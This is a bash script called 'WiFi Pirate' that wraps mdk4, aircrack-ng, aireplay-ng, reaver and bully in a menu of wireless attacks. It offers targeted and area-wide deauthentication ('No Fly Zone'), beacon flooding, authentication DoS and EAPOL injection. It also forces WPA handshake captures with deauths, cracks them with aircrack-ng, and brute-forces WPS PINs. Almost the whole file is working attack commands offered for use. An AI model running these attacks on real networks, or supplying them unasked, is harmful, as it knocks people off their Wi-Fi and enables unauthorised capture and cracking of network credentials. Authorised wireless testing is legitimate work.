#!/bin/bash

source "./functions.sh"

echo -e "

    ██╗    ██╗██╗███████╗██╗     █████╗ ██╗██████╗  █████╗ ████████╗███████╗
    ██║    ██║██║██╔════╝██║    ██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
    ██║ █╗ ██║██║█████╗  ██║    ███████║██║██████╔╝███████║   ██║   █████╗
    ██║███╗██║██║██╔══╝  ██║    ██╔══   ██║██╔══██╗██╔══██║   ██║   ██╔══╝
    ╚███╔███╔╝██║██║     ██║    ██║     ██║██║  ██║██║  ██║   ██║   ███████╗
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
        "

echo -e "
╔══════════════════════════════════════════════════════════════════════════════╗
║ [+] Author   : SpacePirate           ║  [+] Github:                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
║ Python wrap script around multiple wirelless tools for easier and faster use ║
╔══════════════════════════════════════════════════════════════════════════════╗
║                                    Menu                                      ║
╔══════════════════════════════════════════════════════════════════════════════╗
║  [1] -> Wi-Fi Scanner                ║  [a] -> Prepare Interface             ║
║  [2] -> Deauth Attack                ║  [b] -> Reselect Interface            ║
║  [3] -> Beacon Flood    	       ║  [c] -> Restore Interface             ║
║  [4] -> Autentication DoS            ║  	                               ║
║  [5] -> EAPOL 802.1X Injection       ║                                       ║
║  [6] -> WPA/2 Handshake Collector    ║  [pp] -> Install Packages             ║
║  [7] -> WPS attack                   ║  [ee] -> Exit                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
        "
menu(){
echo -e "
╔═════════════════════════════════════════════════════════════════════════════╗
║                                    Menu                                     ║
╔═════════════════════════════════════════════════════════════════════════════╗
║  [1] -> Wi-Fi Scanner                ║  [a] -> Prepare Interface            ║
║  [2] -> Deauth Attack 	       ║  [b] -> Reselect Interface           ║
║  [3] -> Beacon Flood		       ║  [c] -> Restore Interfaces           ║
║  [4] -> Autentication DoS	       ║  	                              ║
║  [5] -> EAPOL 802.1X Injection       ║                                      ║
║  [6] -> WPA/2 Handshake Collector    ║                                      ║
║  [7] -> WPS attack                   ║  [ee] -> Exit                        ║
╚═════════════════════════════════════════════════════════════════════════════╝
║ WLAN monitoring interface: $wlan0mon 
╚═════════════════════════════════════════════════════════════════════════════╝
        
        
"
}	

BeaconFloodList(){
	echo -e "
╔═════════════════════════╗
║     Select Wordlist     ║
╔═════════════════════════╗
║  [1] common SSID list   ║
║  [2] meme SSID list     ║
║  [3] classic Rick Roll  ║
║  [4] extended Rick Roll ║
╚═════════════════════════╝
"
wlan0mon=$1
read -p "Wordlist: " wordlist
case $wordlist in
1)
	echo -e "Starting spamming ..."
	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_common.txt -s 500
	;;
2)
	echo -e "Starting spamming ..."
	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_meme.txt -s 500
	;;
3)
	echo -e "Starting spamming ..."
	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick.txt -s 500
	;;
4)
	echo -e "Starting spamming ..."
	watch -n 60 mdk4 $wlan0mon b -f ./ssidLists/ssid_rick_pro.txt -s 500
	;;
*)	
	echo -e "Starting spamming ..."
	watch -n 60 mdk4 $wlan0mon b -a 150 -s 500
	;;
esac

}

DeauthAttack(){
wlan0mon=$1
airodump-ng $wlan0mon
echo -e "
╔═════════════════════════════════╗
║     Select Deauth Magnitude     ║
╔═════════════════════════════════╗
║  [1] Targeted BSSID Deauth   	  ║
║  [2] Targeted SSID Deauth   	  ║
║  [3] Channel Wide Deauth    	  ║
║  [4] No Fly Zone	  	  ║
╚═════════════════════════════════╝
"
read -p "Attack Magnitude: " magnitude
case $magnitude in
	1) 
		
		wlan_if="$1"                     
		file="targets.txt"

		: > "$file"                      

		echo -e "Enter BSSID:\nPress ENTER with empty bssid entry to start attack"

		while true; do
			  read -r -p "BSSID: " bssid
			  [[ -z $bssid ]] && break       

  			if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    				echo "$bssid" >> "$file"
    				echo "Saved ➜ $bssid"
  			else
    				echo "Invalid Format"
  			fi
		done	

		if [[ ! -s $file ]]; then
  			echo "No Target chosen, exiting."
  			exit 1
		fi	

		echo "Starting Attack"
			watch -n 60 mdk4 "$wlan_if" d -b "$file"
			;;
	2)
		read -p "Enter SSID to Deauth: " TargetSsid
		echo -e "Starting attack"
		watch -n 60 mdk4 $wlan0mon d -E $TargetSsid
		;;	
	3)
		read -p "Enter Channel/s to Deauth (Format: ch,ch...): " channels
		echo -e "Starting attack"
		watch -n 60 mdk4 $wlan0mon d -c $channels
		;;
	4)
		echo -e "Starting attack"
		watch -n 60 mdk4 $wlan0mon d --ghost 200,54,1
		;;
	*)
		echo -e "Starting attack"
		watch -n 60 mdk4 $wlan0mon d --ghost 200,54,1
		;;	

	esac
}
        
ApDos(){
wlan0mon=$1
echo -e "
╔═════════════════════════════════╗
║     Select DoS Magnitude        ║
╔═════════════════════════════════╗
║  [1] Targeted AP/Station brute  ║
║  [2] Target AP/Station smart	  ║
║  [3] No Fly Zone	  	  ║
╚═════════════════════════════════╝
"
read -p "Enter Attack Magnitude: " Magnitude
case $Magnitude in
	1)
		read -p "Enter MAC to DoS: " mac
		echo -e "Starting DoS-ing ..."
		watch -n 60 mdk4 $wlan0mon a -a $mac -m
		;;
	2)
		read -p "Enter MAC to DoS: " mac
		echo -e "Starting DoS-ing ..."
		watch -n 60 mdk4 $wlan0mon a -i $mac -m
		;;
	3)
		echo -e "Starting DoS-ing ..."
		watch -n 60 mdk4 $wlan0mon a
		;;
	*) 
		break
		;;
	


esac

}


EapolInjection(){
wlan0mon=$1
airodump-ng $wlan1mon
echo -e "
╔═════════════════════════════════╗
║     Select Injection Type       ║
╔═════════════════════════════════╗
║  [1] Deauth clients		  ║
║  [2] DoS Station & RADIUS	  ║
╚═════════════════════════════════╝
"
read -p "Enter attack type: " AttackType
case $AttackType in
	1)
		read -p "Enter MAC to attack: " TargetMac
		watch -n 60 mdk4 $wlan0mon e -t $TargetMac
		;;
	2)
		read -p "Enter MAC to attack: " TargetMac
		watch -n 60 mdk4 $wlan0mon e -t $TargetMac -l
		;;
	*)	
		break
		;;

esac




}

GetHandshake() {
    local wlan0mon="$1"
    airodump-ng $wlan0mon

    read -rp "Target BSSID: "   TargetBssid
    read -rp "Target channel: " TargetChan

    (watch -n 10 aireplay-ng --deauth 4 -a "$TargetBssid" "$wlan0mon" \
	    >/dev/null 2>&1) &
    local DeauthPID=$!
    echo "[+] Deauth PID: $DeauthPID"

    local pcap_dir="./handshakes"
    mkdir -p "$pcap_dir"
    local cap_file="$pcap_dir/$TargetBssid-$(date +%H%M%S).cap"

    stdbuf -oL airodump-ng --bssid "$TargetBssid" \
        --channel "$TargetChan" \
        --write "$pcap_dir/$TargetBssid" "$wlan0mon" 2>/dev/null |
    while IFS= read -r line; do
        echo "$line"
        if [[ "$line" =~ WPA\ handshake ]]; then
            echo "[+] Handshake detected, shutting down…"
	    kill -9 "$DeauthPID" > /dev/null
            pkill -P $$ airodump-ng > /dev/null        
            break
        fi
    done

    wait 2>/dev/null          
    rm -f ./handshakes/*.csv ./handshakes/*.netxml  
    local FileName
    FileName=$(ls -t "$pcap_dir"/*.cap 2>/dev/null | head -n1)

    [[ -z $FileName ]] && { echo "[-] No .cap file"; return 1; }

    echo "[+] CAP file $FileName results:"
    aircrack-ng "$FileName" | grep -E "WPA|BSSID"
}



WpsAttack(){
wlan0mon=$1
echo -e "
╔═════════════════════════════════╗
║     Select WPS attack tool      ║
╔═════════════════════════════════╗
║  [1] Reaver			  ║
║  [2] Bully			  ║
╚═════════════════════════════════╝
"
read -p "Enter tool selection: " ToolSel
wash -i $wlan0mon -C -s
read -p "Enter target BSSID: " TargetBssid
read -p "Enter target Channel: " TargetChan
if [ "$ToolSel" -eq 1 ]; then
    reaver -i "$wlan0mon" -b "$TargetBssid" -c "$TargetChan" -vvv -K 1 --no-associate  ||  \
    	reaver -i "$wlan0mon" -b "$TargetBssid" -c "$TargetChan" -vvv --no-associate

else
    bully "$wlan0mon" -b "$TargetBssid" -c "$TargetChan" -v 3 -d
fi

}


InstallPkgs() {
  set -euo pipefail
  export DEBIAN_FRONTEND=noninteractive

  if [[ -f /etc/os-release ]]; then
    . /etc/os-release
    DISTRO_ID=$ID          # ubuntu | debian | raspbian
    CODENAME=$VERSION_CODENAME
  else
    echo "unknown distro /etc/os-release"
  fi

  echo ": $PRETTY_NAME"

  if [[ "$DISTRO_ID" == "ubuntu" ]]; then
    sudo apt-get update -y
    sudo apt-get dist-upgrade -y

  elif [[ "$DISTRO_ID" == "raspbian" || "$DISTRO_ID" == "debian" ]]; then
    if ! grep -q "raspbian" /etc/apt/sources.list; then
      echo "➡️ adding raspbian mirror v /etc/apt/sources.list ..."
      echo "deb http://archive.raspbian.org/raspbian/ $CODENAME main contrib non-free" | \
        sudo tee -a /etc/apt/sources.list
      wget -qO - https://archive.raspbian.org/raspbian.public.key | sudo apt-key add -
    fi
    sudo apt-get update -y
    sudo apt-get dist-upgrade -y
  else
    echo "Unsupported distro ($DISTRO_ID), install packages manualy"
  fi

  sudo apt-get install -y \
       build-essential git curl wget ca-certificates gnupg lsb-release \
       net-tools iproute2 dnsutils tmux htop unzip                   \
       aircrack-ng mdk4 hashcat reaver bully iw wireless-tools      \
       macchanger python3-venv python3-pip

  sudo apt-get autoremove -y
  sudo apt-get clean

  echo "Installation complete $PRETTY_NAME"
}

wlan0mon=""
selection=""
while true; do
	read -p "select function: " selection
	case $selection in
	1)
		airodump-ng $wlan0mon
		;;
	2)
		DeauthAttack $wlan0mon
		;;
	3)	
		BeaconFloodList $wlan0mon
		;;

	4)	
		ApDos $wlan0mon
		;;

	5)
		EapolInjection $wlan0mon
		;;
	
	6)
		GetHandshake $wlan0mon
		;;
	7)
		WpsAttack $wlan0mon
		;;
	a)
		airmon-ng check kill > /dev/null
		echo -e "╔═════════════════════════════════════════════════════════════════════════════╗"
		echo -e	"║                             Network Interfaces                              ║"
		echo -e	"╔═════════════════════════════════════════════════════════════════════════════╗"
		
       		iwconfig 2>/dev/null | awk '/^wlan/{iface=$1} /Mode:/{gsub(/.*Mode:/,"Mode:"); print iface, $0}'
		echo -e "╚═════════════════════════════════════════════════════════════════════════════╝"
		read -p "Select wlan0 interface: " wlan0
		airmon-ng start $wlan0 > /dev/null
		if iwconfig 2>/dev/null | awk '/^wlan/{iface=$1} /Mode:Monitor/{print iface; exit}'; then
			wlan0mon=$(iwconfig 2>/dev/null | awk '/^wlan/{iface=$1} /Mode:Monitor/{print iface; exit}')
		else
			echo -e "No interface in monitor mode"
		fi
		;;
	b)
		echo -e "╔═════════════════════════════════════════════════════════════════════════════╗"
		echo -e "║                             Network Interfaces                              ║"
		echo -e "╔═════════════════════════════════════════════════════════════════════════════╗"	
		iwconfig 2>/dev/null | awk '/^wlan/{iface=$1} /Mode:/{gsub(/.*Mode:/,"Mode:"); print iface, $0}'
		echo -e "╚═════════════════════════════════════════════════════════════════════════════╝"
		read -p "Select monitor interface wlan1mon: " wlan0mon
		;;
	c)
		airmon-ng stop $wlan0mon > /dev/null
		;;

	pp)
	  	InstallPkgs
		;;

	ee|exit)
		echo "Exiting ..."
		airmon-ng stop $wlan0mon > /dev/null
		break
		;;
	*)
		echo "invalid selection, reselect"
		;;
	esac
	menu $wlan0mon

done



